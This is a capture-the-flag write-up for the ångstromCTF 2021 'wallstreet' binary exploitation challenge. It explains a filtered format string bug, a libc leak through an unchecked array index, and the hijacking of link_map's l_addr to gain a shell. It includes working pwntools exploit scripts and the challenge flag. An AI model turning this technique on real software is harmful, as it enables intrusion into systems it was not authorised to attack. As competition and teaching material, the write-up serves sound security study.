---
title: ångstromCTF 2021 - wallstreet (pwn)
date: 2021-04-15
slug: /writeups/angstromctf-2021-wallstreet
excerpt: An unusual trick for format string exploitation
author: Darin Mao
---

wallstreet was a binary exploitation challenge from ångstromCTF 2021. The intended solution involved a stack pivot, but in this writeup I will demonstrate a different technique applicable to many similar challenges.

# Description
> Check out our new market manipulation tool.
>
> Connect with `nc pwn.2021.chall.actf.co 21800`

Files:
- [wallstreet](https://files.actf.co/7fce582f6247c404fe2864406e1eeaef96f608db11d2a593f009226c7d2d5d32/wallstreet)
- [libc-2.32.so](https://files.actf.co/d48f0edffda549cfb524378027d0b997a77a2dd9ea4f69fe3fd553eb1772050b/libc-2.32.so)

# Reversing
Apparently, [Stonk Market](/writeups/picoctf-2021-stonk-market) really upset the author, because the flavortext is copied exactly from that challenge. As in Stonk Market, there is a `buy_stonks` function that contains a single format string vulnerability. However, there is a strange, rather contrived, filter on the format string:

```c
  do {
    if (299 < i) {
      puts("Buying stonks with token:");
      printf(user_buf);
      putchar(10);
      return 0;
    }
    switch(user_buf[i]) {
    case 'A':
    case 'E':
    case 'F':
    case 'G':
    case 'X':
    case 'a':
    case 'c':
    case 'd':
    case 'e':
    case 'f':
    case 'g':
    case 'i':
    case 'o':
    case 'p':
    case 's':
    case 'u':
    case 'x':
      if ((0 < count) || (user_buf[i] != 'c')) {
        puts("Hey! Only one leak allowed!");
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      count = count + 1;
    }
    i = i + 1;
  } while( true )
```

Essentially, we are not allowed to use any of these letters except for `c`, which we are allowed to use once. Note that `n` is *not* blocked, so we can potentially write to memory.

The only other difference between this challenge and Stonk Market is the ability to "see" a stonk right before the format string vulnerability.

```c
  puts("What stonk do you want to see?");
  stonk_idx = 0;
  __isoc99_scanf("%d",&stonk_idx);
  puts(stonks[stonk_idx]);
```

We will use this to get a leak.

# libc leak
Note that there is no bounds checking in the stonk viewing, so we can specify indices both before and after the intended array. Since this array is on the stack, we can likely find a pointer to a libc address that we can leak.

Unfortunately, many libc leaks involving the stack are highly reliant on environment, and we do not have access to the deploy used in this challenge. However, even though data *down* the stack is unknown, data *up* the stack should be fairly consistent, because the data there is mostly made up of locals from previous function calls. With some trial and error, we find that an index of -16 points to `stdout@got`, which was placed there by a call to `puts`. This index directly leaks the address of `_IO_2_1_stdout_`, giving us the address of libc.

# Writing to `struct link_map`
glibc uses a large structure called `link_map` to describe each loaded object in memory. These structures form a linked list, and they are used by the dynamic linker. Since it is used during the program startup process, there is almost always a pointer to this structure (describing the main ELF) somewhere down the stack. This means that, with our format string vulnerability, we can overwrite the first few bytes of this structure, and that corresponds to the `l_addr` member.

When the program exits, `_dl_fini` is in charge of calling all the destructors for all loaded objects. The way it does this is by looking at the `link_map` structures ([source](https://elixir.bootlin.com/glibc/glibc-2.32/source/elf/dl-fini.c#L131)).

```c
/* First see whether an array is given.  */
if (l->l_info[DT_FINI_ARRAY] != NULL)
  {
    ElfW(Addr) *array =
      (ElfW(Addr) *) (l->l_addr
          + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
    unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
          / sizeof (ElfW(Addr)));
    while (i-- > 0)
      ((fini_t) array[i]) ();
  }
```

Basically, it finds the location of the `FINI_ARRAY` by finding the location of the `DT_FINI_ARRAY` dynamic section entry, then *adds it to the value of `l_addr`*. Therefore, we can offset the location of the `FINI_ARRAY` to point to our own input, then place a function pointer there to get rip control.

Conveniently, our input is in a global buffer, at a constant offset from `FINI_ARRAY`. The `FINI_ARRAY` is at `0x403e18`, and `user_buf` starts at `0x4040e0`, giving us a difference of 712. However, we'll need some space to do the format string, so we'll add 16 bytes to get 728.

The only tricky part is figuring out where the pointer to `link_map` is. On my local computer, it was at an offset of 98, but, as previously stated, going down the stack this far is highly reliant on environment. However, we can brute force this offset by writing a function pointer to `main` and trying different offsets around 98. Whichever offset successfully returns back to `main` on the remote server is the pointer to `link_map`. Code to do this is below.

```python
# find offset of struct link_map *
with context.quiet:
  for k in range(90, 110):
    try:
      print(k)
      r = conn()
      r.sendline('1')
      r.sendline('0')
      r.sendafter('token?\n', f'%728c%{k}$n'.ljust(16, ' ').encode() + p64(exe.sym['main']))
      r.recvuntil('trading app')
      print('found', k)
      break
    except:
      pass
    finally:
      r.close()
```

This finds the offset on the remote server to be 100.

# Angry Gadget
I thought this technique was pretty interesting, so I was quite disappointed when I found that no `one_gadget` for this specific libc produced a shell. However, in some cases, [angry_gadget](https://github.com/ChrisTheCoolHut/angry_gadget) can find some more magic addresses with more complicated constraints. With some trial and error, I found this working gadget:

```
libc_base + 0xdf7a6 :
        <Bool reg_rbp_15728_64{UNINITIALIZED} == 0x47>
        <Bool 0xffffffffffffffb0 + reg_rbp_15728_64{UNINITIALIZED} == 0xfffffffffffffff7>
```

This gives us a shell.

```python
r = conn()
r.sendline('1')

# libc leak
r.sendlineafter('want to see?\n', '-16')
libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdout_']
log.info(hex(libc.address))

# format string
r.sendafter('token?\n', f'%728c%{k}$n'.ljust(16, ' ').encode() + p64(libc.address + 0xdf7a6))
r.interactive()
```

# Flag
```
actf{i_thought_i_had_it_all_together_but_i_was_led_astray_the_day_you_stack_pivoted_5e1d1028cc862facee3d95ea}
```
